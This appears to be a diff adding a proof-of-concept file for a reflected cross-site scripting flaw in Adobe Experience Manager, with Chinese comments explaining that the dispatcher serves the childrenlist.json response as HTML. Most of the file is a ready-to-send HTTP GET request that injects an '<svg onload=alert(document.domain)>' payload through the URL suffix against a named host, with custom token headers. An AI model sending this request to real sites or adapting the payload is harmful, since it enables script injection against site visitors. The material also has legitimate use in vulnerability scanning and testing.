@@ -1,0 +1,9 @@
+# Adobe Experience Manager 跨站脚本漏洞#2
+# Adobe Experience Manager包含一个跨站点脚本漏洞，当调度器不尊重AEM响应的内容类型并从application/json转换为text/html时，通过使用选择器子列表的请求。因此，在浏览器中执行并解释反映的后缀。
+GET /etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html?acid=80050898&bid=hd_tag_m8mv24jm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24jm
+RM-PRO-Token: e1b5bc7e4bd24e5afaa6a7390a2c8851
+RM-PRO-Time: 1742808386611
+User-Agent: curl/7.83.1
+
